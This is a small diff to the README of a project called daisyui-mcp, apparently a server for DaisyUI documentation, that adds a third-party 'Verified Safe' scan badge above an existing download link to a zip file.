@@ -1,5 +1,7 @@
 # 🌼 daisyui-mcp - A Simple Server for DaisyUI Docs
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/sidiqhadi-daisyui-mcp)
+
 ![Download](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip)
 
 ## 🚀 Getting Started
